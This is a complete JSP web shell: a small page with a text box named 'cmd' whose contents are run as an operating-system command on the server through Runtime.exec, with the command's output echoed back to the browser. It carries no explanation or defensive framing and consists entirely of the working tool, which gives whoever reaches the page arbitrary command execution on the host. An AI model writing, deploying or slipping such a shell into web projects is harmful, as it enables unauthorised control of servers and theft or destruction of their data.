<%@ page import="java.util.*,java.io.*"%>
<HTML><BODY>                                                                                                                                                             
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">           
<INPUT TYPE="submit" VALUE="Send">       
</FORM>
<pre>
<%
try {
    String dos=request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(dos);
    BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = input.readLine()) != null) { out.println(line); }
    input.close();
} catch (Exception e) { out.println(); }
%>
</pre>
</BODY></HTML>

